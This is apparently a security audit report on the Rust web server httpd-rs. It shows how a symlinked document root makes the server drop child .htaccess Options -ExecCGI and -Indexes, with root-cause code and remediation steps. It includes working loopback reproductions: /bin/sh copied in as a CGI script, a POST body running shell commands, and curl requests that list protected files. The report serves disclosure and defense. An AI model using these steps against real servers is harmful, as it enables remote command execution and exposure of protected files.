# httpd-rs adversarial findings — Pass 9

**Target:** the current working tree at `HEAD 469266f`
(`Expand test coverage and fix vulns`), rebuilt from source with
`cargo build --release -p httpd-rs`. The repository source was not modified for
this pass; all fixtures live under `/tmp/opencode/p9-*`.

**Environment:** Linux, loopback only. Apache 2.4.69 (Debian) was used as a
local differential oracle. No external network, real web server, or IP address
was involved.

**Status of this pass:** one new critical remote-code-execution chain was
reproduced end to end. The current tree's 372 Rust tests and 52 adversarial
replay tests pass; this shape is not covered.

* **F59 (Critical):** the new `RequestPlan::from_fs_target()` uses the explicit
  canonical target only for `plan.fs_path`; it still builds the `.htaccess`
  layer list from `root.join(file_name)` and then discards the initial scope.
  When the URL mapping root contains a symlink (for example a
  `current`/release symlink used as `DocumentRoot` or `Alias`), the canonical
  target is outside the lexical mapping root, so every subdirectory
  `.htaccess` effect is lost during target re-authorization. A subdirectory
  that sets `Options -ExecCGI` is executed anyway under a server-level
  `Options +ExecCGI` plus `AddHandler cgi-script`.
* The same root cause bypasses `.htaccess Options -Indexes` and executes
  `DirectoryIndex` CGI scripts that Apache refuses with `403`.
* The initial request scope is correct; `--explain` shows the subdirectory
  `.htaccess` and `Options(2)` (ExecCGI off), yet the request returns `200`
  with command output. This is a target-scope identity bug above the verified
  kernels, not a break of the URL normalizer, `openat2`, or the Verus
  contracts.

---

## Top exploit chain

### 1. F59 — symlinked DocumentRoot + `.htaccess Options -ExecCGI` = arbitrary command execution

A normal modern deployment publishes a release through a symlink:

```text
/srv/app/current/public     ← real files
/var/www/html -> /srv/app/current/public
```

The document root is `AllowOverride All`, and CGI is enabled at server level
(the common “CGI host” configuration):

```apache
DocumentRoot "/var/www/html"
Options +ExecCGI +FollowSymLinks

<Directory "/var/www/html">
    AllowOverride All
    Require all granted
</Directory>

AddHandler cgi-script .cgi
```

The uploads/administrative subdirectory then disables CGI execution, as it
should:

```apache
# /srv/app/current/public/admin/.htaccess
Options -ExecCGI
```

An attacker places (or uploads through any ordinary application upload/plugin
path) an executable `admin/sh.cgi`. For the local proof it is an exact copy of
`/bin/sh`; any uploaded ELF or executable script works the same way. The CGI
request body is the shell program:

```http
POST /admin/sh.cgi HTTP/1.1
Host: 127.0.0.1
Content-Length: <body length>

printf 'Content-Type: text/plain\r\n\r\n'; id
```

Apache 2.4.69 reads the subdirectory `.htaccess` and returns `403`. httpd-rs
returns `200` and executes the shell as the web user:

```text
apache=403
httpd-rs=200
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That is arbitrary command execution on the server under the CGI account. The
only application-side precondition is the ability to place an executable file
in the web tree, which is a normal upload, plugin, or deployment feature. If no
such write primitive exists, the same bug still executes any pre-existing
executable in the affected tree that `.htaccess` was supposed to disable.

### 2. F59-B — `DirectoryIndex` CGI executes despite `.htaccess`

No upload is needed for this variant. Put an executable CGI index in the
protected directory:

```text
/srv/app/current/public/admin/index.cgi   (mode 0755)
# /srv/app/current/public/admin/.htaccess
Options -ExecCGI
```

and configure `DirectoryIndex index.cgi`. A request for `/admin/`:

```text
apache /admin/          -> 403
apache /admin/index.cgi -> 403
httpd-rs /admin/          -> 200  WALLET-DIRINDEX-CGI
httpd-rs /admin/index.cgi -> 200  WALLET-DIRINDEX-CGI
```

The directory request is authorized against the lexical path, where
`.htaccess` turns ExecCGI off. The internal `DirectoryIndex` subrequest is then
re-authorized against the canonical target, but its target scope has no
`.htaccess` layer, so server-level `Options +ExecCGI` wins and the index script
runs.

### 3. F59-C — `.htaccess Options -Indexes` is ignored; protected names leak

The same target-scope loss affects autoindex policy. With a root
`Options +Indexes` and a child `.htaccess` `Options -Indexes`:

```text
apache /list/   -> 403
httpd-rs /list/  -> 200, autoindex body contains wallet.dat
```

The child policy is read by the initial plan and shown by `--explain`, but the
canonical-target scope loses it. This is a direct filename/secret enumeration
primitive even without CGI.

---

## Findings at a glance

| ID | Severity | Area | Demonstrated impact | Preconditions |
|---|---|---|---|---|
| F59 | Critical | target re-authorization / `.htaccess` layer identity | `Options -ExecCGI` and handler policy bypassed; arbitrary command execution after a normal executable upload; pre-existing protected CGI executed | mapping root contains a symlink (`DocumentRoot`/`Alias`), `AllowOverride` on the lexical root, server-level `Options +ExecCGI`/handler, child `.htaccess` disables execution; attacker-writable executable for the arbitrary-code variant |
| F59-B | Critical | `DirectoryIndex` target scope | protected CGI index executed with no upload; Apache 403 | same symlinked root + child `.htaccess Options -ExecCGI` + `DirectoryIndex *.cgi` |
| F59-C | High | autoindex target scope | `.htaccess Options -Indexes` ignored; directory listing exposes protected names | same symlinked root + child `.htaccess Options -Indexes` + root `Options +Indexes` |

---

# F59. Critical: `from_fs_target()` builds `.htaccess` layers from a fabricated path and loses all child policy on canonical target re-authorization

## Impact

For any request whose opened/canonical target differs from the lexical
URL-mapped path because the **mapping root itself contains a symlink**, the
dispatcher replaces the correct initial scope with a target scope whose
`.htaccess` layers were collected for the wrong path. In practice:

* `Options -ExecCGI` in a child `.htaccess` is ignored, so an executable file
  runs as CGI under a server-level `Options +ExecCGI`.
* `Options -Indexes` in a child `.htaccess` is ignored, so autoindex is served.
* Any other child `.htaccess` policy that relies on the target scope (handlers,
  MIME, environment, headers) is also dropped. Access rules such as
  `Require` are still enforced by the initial lexical scope for ordinary
  requests, which is why the cleanest Apache differential is execution/listing
  policy rather than a direct `Require` bypass.

A symlinked document root is not exotic: release symlinks (`current`), Docker
image layouts, and shared-hosting document roots are common. `AllowOverride
All` plus a hardening `.htaccess` in `uploads/`, `cache/`, `storage/` or an
administrative directory is also a normal configuration. The result is a
critical execution boundary bypass.

## Reproduction A: arbitrary command execution

Fixture:

```sh
D=/tmp/opencode/p9-sh
rm -rf "$D"; mkdir -p "$D/real/public/admin" "$D/www" "$D/logs"
ln -s "$D/real/public" "$D/www/html"

# Stand-in for an uploaded executable. Any attacker-uploaded ELF/script works.
cp /bin/sh "$D/real/public/admin/sh.cgi"
chmod 755 "$D/real/public/admin/sh.cgi"

# The hardening policy Apache enforces and httpd-rs loses.
printf 'Options -ExecCGI\n' > "$D/real/public/admin/.htaccess"

cat > "$D/httpd-rs.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19431
PidFile "$D/logs/v.pid"
ErrorLog "$D/logs/v.err"
ServerName localhost
DocumentRoot "$D/www/html"
Options +ExecCGI +FollowSymLinks
<Directory "$D/www/html">
    AllowOverride All
    Require all granted
</Directory>
AddHandler cgi-script .cgi
EOF
```

The equivalent Apache config differs only in `Listen` and `PidFile`; it also
loads `mod_mpm_event`, `mod_authz_core`, `mod_authz_host`, `mod_mime`,
`mod_dir`, and `mod_cgi`.

Run both servers and send the body `/bin/sh` will execute:

```sh
printf "printf 'Content-Type: text/plain\\r\\n\\r\\n'; id; cat /etc/hostname\n" > "$D/payload"

curl -s -o "$D/abody" -w 'apache=%{http_code}\n' -X POST \
  --data-binary "@$D/payload" http://127.0.0.1:<apache-port>/admin/sh.cgi
curl -s -o "$D/vbody" -w 'httpd-rs=%{http_code}\n' -X POST \
  --data-binary "@$D/payload" http://127.0.0.1:19431/admin/sh.cgi
```

Observed:

```text
apache=403
httpd-rs=200
uid=33(www-data) gid=33(www-data) groups=33(www-data)
debian
```

Apache's refusal is the `Options ExecCGI is off in this directory` check. httpd-rs
never applies that child policy after target re-authorization.

The initial scope really is correct. `--explain /admin/sh.cgi` shows:

```text
canonical_url_path: /admin/sh.cgi
document_root: /tmp/opencode/p9-sh/www/html
fs_path: /tmp/opencode/p9-sh/www/html/admin/sh.cgi
access_layers:
  dir=/tmp/opencode/p9-sh/www/html/admin ... subject=Some("sh.cgi")
access_file_trace:
  /tmp/opencode/p9-sh/www/html/admin/.htaccess ... rules=0
options: Options(2)          # ExecCGI off
htaccess: 1 layer(s) applied
```

The actual response is still `200`. The initial scope is used for the first
access check, then thrown away by `bind_target_grant()`.

## Reproduction B: `DirectoryIndex` CGI, no upload

```sh
D=/tmp/opencode/symdirindex
mkdir -p "$D/real/public/admin" "$D/www"
ln -s "$D/real/public" "$D/www/html"
printf '#!/bin/sh\nprintf "Content-Type: text/plain\\r\\n\\r\\n"\nprintf "WALLET-DIRINDEX-CGI\\n"\n' \
  > "$D/real/public/admin/index.cgi"
chmod 755 "$D/real/public/admin/index.cgi"
printf 'Options -ExecCGI\n' > "$D/real/public/admin/.htaccess"
```

Config: the same symlinked `DocumentRoot`, `Options +ExecCGI +FollowSymLinks`
at server level, `DirectoryIndex index.cgi`, `AddHandler cgi-script .cgi`, and
`AllowOverride All` on `/tmp/.../www/html`.

Observed:

```text
apache /admin/          -> 403
apache /admin/index.cgi -> 403
httpd-rs /admin/          -> 200  WALLET-DIRINDEX-CGI
httpd-rs /admin/index.cgi -> 200  WALLET-DIRINDEX-CGI
```

No attacker file is needed here; the attacker triggers execution of an
existing CGI that the site explicitly disabled. If that script is an
administrative/index tool, this is direct server-side code execution.

## Reproduction C: autoindex policy loss

```sh
D=/tmp/opencode/p9-index
mkdir -p "$D/real/public/list" "$D/www"
ln -s "$D/real/public" "$D/www/html"
printf 'secret\n' > "$D/real/public/list/wallet.dat"
printf 'Options +Indexes\n' > "$D/real/public/.htaccess"
printf 'Options -Indexes\n' > "$D/real/public/list/.htaccess"
```

With server-level `Options +Indexes +FollowSymLinks` and `AllowOverride All` on
the lexical root:

```text
apache /list/   -> 403
httpd-rs /list/  -> 200, autoindex contains wallet.dat
```

## Root cause

The new `RequestPlan` constructor has two path identities, but only one is
updated:

```rust
// crates/server/src/request_plan.rs:216-237
pub fn from_fs_target(
    cfg: &Config,
    vhost: Option<&VHost>,
    target: CanonicalTarget,
    root: PathBuf,
    fs_path: PathBuf,
    script_alias: bool,
) -> Result<Self, PlanError> {
    let rel = fs_path
        .strip_prefix(&root)
        .map(Path::to_path_buf)
        .unwrap_or_else(|_| {
            PathBuf::from(
                fs_path
                    .file_name()
                    .map(|name| name.to_os_string())
                    .unwrap_or_default(),
            )
        });
    let mut plan = Self::build(cfg, vhost, target, root, rel, script_alias)?;
    plan.fs_path = fs_path;       // explicit target
    Ok(plan)                       // ...but layers were built from root/rel
}
```

`build()` immediately reconstructs a different path and parses access files
there:

```rust
// crates/server/src/request_plan.rs:240-260
fn build(...) -> Result<Self, PlanError> {
    let fs_path = root.join(&rel);       // fabricated path, not explicit target
    let layers = if cfg.htaccess_may_apply(&fs_path) {
        crate::htaccess::collect_layers_with_root(
            cfg,
            vhost,
            &fs_path,
            &target.url_path,
            Some(&root),
        )...
    } else {
        Vec::new()
    };
```

When the mapping root is a symlink such as

```text
DocumentRoot = /var/www/html
/var/www/html -> /srv/app/current/public
```

the opened descriptor's canonical path is `/srv/app/current/public/admin/sh.cgi`.
`fs_path.strip_prefix("/var/www/html")` fails, so `rel` becomes only
`sh.cgi` and layers are collected for `/var/www/html/sh.cgi`. The real target's
ancestors—including `/srv/app/current/public/admin/.htaccess`—are never walked.

It gets worse in `evaluate_scope()`. If the canonical target is under an
override-enabled `<Directory>` (for example a `<Directory />` rule), it asks
`effective_scope_with_layers()` to apply `self.layers` while walking the
**canonical** `self.fs_path`:

```rust
// crates/server/src/request_plan.rs:302-319
if cfg.htaccess_may_apply(&self.fs_path) {
    let (scope, ...) = crate::policy_ref::effective_scope_with_layers(
        cfg,
        vhost,
        &self.fs_path,          // canonical target
        &self.target.url_path,
        req,
        peer,
        &self.layers,           // layers with fabricated /var/www/html dirs
    );
```

`effective_scope_with_layers()` only applies a layer when
`layer.identity.dir` is one of the canonical target's ancestors. The fabricated
`/var/www/html/sh.cgi` layers do not match
`/srv/app/current/public/admin`, so **no access-file layer is applied at all**.

If the canonical target is *not* under an override-enabled `<Directory>` (the
primary p9-sh configuration, where only the lexical `/var/www/html` is
override-enabled), the branch condition `cfg.htaccess_may_apply(&self.fs_path)`
is false and `evaluate_scope()` takes the cached global path instead, ignoring
`self.layers` completely. Both branches end in the same fail-open result: the
canonical target has no child `.htaccess` policy.

Finally, the dispatcher replaces the initial, correct scope with this broken
target scope:

```rust
// crates/server/src/server.rs:1430-1431
let (mut target_scope, ...) =
    evaluate_scope_for_path(cfg, vhost, actual_path, url_path, req, peer, mapping_root)...
...
// crates/server/src/server.rs:2400-2403
let scope = &target_scope;      // initial scope and its .htaccess effects discarded
let grant = &target_grant;
```

`evaluate_scope_for_path()` calls `RequestPlan::from_fs_target()`
(`crates/server/src/server.rs:1362-1371`), so every target re-authorization path
(`bind_target_grant`, `authorize_resolved_target`, PATH_INFO CGI, FastCGI,
rewrite filesystem targets, DirectoryIndex internal subrequests) uses the
broken constructor. `crates/server/src/request_plan.rs` even has a test that
asserts the bug as expected behavior:

```rust
// request_plan.rs:524-543
#[test]
fn fs_target_outside_mapping_root_keeps_explicit_path() {
    ...
    assert!(plan.layers().is_empty());   // no target .htaccess, by construction
}
```

That test treats “explicit target outside the mapping root” as “no access
files,” which is exactly the fail-open assumption F59 breaks.

The verified kernels are not at fault. URL normalization, canonical-path
invariants and `openat2(RESOLVE_BENEATH)` all behave correctly; the runtime
adapter compares a lexical `root` with a canonical `fs_path`, then drops the
policy it already collected.

## Remediation

1. **Make the explicit target the single source of its access layers.** Change
   `from_fs_target()` / `build()` so the layer walk consumes the supplied
   `fs_path`, not `root.join(rel)`. The mapping root is only for URL-mount /
   `RewriteBase` derivation; it must not fabricate the filesystem path used to
   read `.htaccess`.
2. If a canonical target is outside the lexical mapping root, still collect
   layers from **that canonical target's own ancestors** (and from any
   effective ancestor directories), exactly as the initial plan does for its
   lexical path.
3. Never let `evaluate_scope()` silently ignore a nonempty layer list. If the
   layer directories do not match the target path, recompute the layers from
   the target or fail closed with a `500`; do not fall through to the global
   scope.
4. Keep the initial scope's child `.htaccess` effects when target policy cannot
   be constructed soundly. Dropping a `Require`/`Options`/handler policy is
   fail-open even if the target inode is bound.
5. Apply the same identity rule to the cache/DirectoryIndex index plan
   (`cache::request_scope_with_plan` also calls `RequestPlan::from_fs_target`).
6. Add differential tests for:
   * symlinked `DocumentRoot` + child `.htaccess Options -ExecCGI` + direct CGI,
   * the same with `DirectoryIndex index.cgi` and `ErrorDocument` CGI,
   * `Options -Indexes`, `RemoveHandler`, and `SetHandler none`,
   * symlinked `Alias`/`ScriptAlias` roots,
   * CGI, FastCGI, PATH_INFO, and rewrite-filesystem targets,
   * cache-enabled `DirectoryIndex` policy changes,
   * `--explain` reporting the canonical target's actual layers.

## Model / regression updates

Add an invariant such as:

```text
I60 — explicit-target access-layer binding
For every RequestPlan built from an explicit target path T, every access-file
layer consumed by target authorization must be a layer of T's own ancestor
directories. The plan's fs_path, layer walk root, and layer identity directories
must be derived from the same canonical T. A mapping root that contains a
symlink may be used for URL-mount/RewriteBase derivation, but may never cause
the target's .htaccess layers to be read from, or silently replaced by, a
fabricated root/file_name path.

If an explicit target lies outside the lexical mapping root, either walk T's
real ancestors and apply their layers, or fail closed. “No layers” is not a
valid result merely because strip_prefix(root, T) failed.
```

Extend `tests/adversarial_regressions.py` with the F59 fixtures and assert the
Apache differential (`403` for `Options -ExecCGI`, `Options -Indexes`) as well
as the httpd-rs result. The existing `fs_target_outside_mapping_root_keeps_explicit_path`
unit test must be inverted/replaced, not extended.

---

## Cross-cutting observations

* **F59 is a target-scope identity bug, not a parser or kernel bypass.** The
  initial `RequestPlan::from_request()` is correct; the bug appears when a
  resolved/canonical target is re-planned through `from_fs_target()`.
* **It is the direct successor to the F39/F41/F50/F53/F58 access-walk
  fixes.** Those fixes made the initial access walk broad and canonical-aware;
  the new `RequestPlan` abstraction introduced a constructor that silently
  reintroduces a lexical-vs-canonical split at the target boundary.
* **The attack is ordinary HTTP.** No race, no local account, no cache state,
  and no malformed request is required for F59-B. F59-A additionally needs a
  writable executable, which is a normal upload/plugin primitive.
* **Automatic listing and source disclosure are collateral.** Any child
  `.htaccess` effect that is not enforced by the initial access check is lost
  in the target scope; `Options -Indexes` is the simplest demonstration.

---

## Reproduction notes

* All fixtures are under `/tmp/opencode/p9-*`; the repository source was not
  edited for this pass.
* `target/release/httpd-rs` was rebuilt from `HEAD 469266f` with
  `cargo build --release -p httpd-rs` before the pass.
* Apache 2.4.69 was started with private loopback configs and only the modules
  needed for `Options`/`AddHandler`/CGI/autoindex.
* The CGI proof uses `/bin/sh` copied to an executable `.cgi` file as a
  stand-in for an uploaded executable. The request body is executed directly by
  the CGI process; the output demonstrates the server running commands as
  `www-data`.
* Requests use `curl -X POST --data-binary` for the shell body; no external
  network is involved.
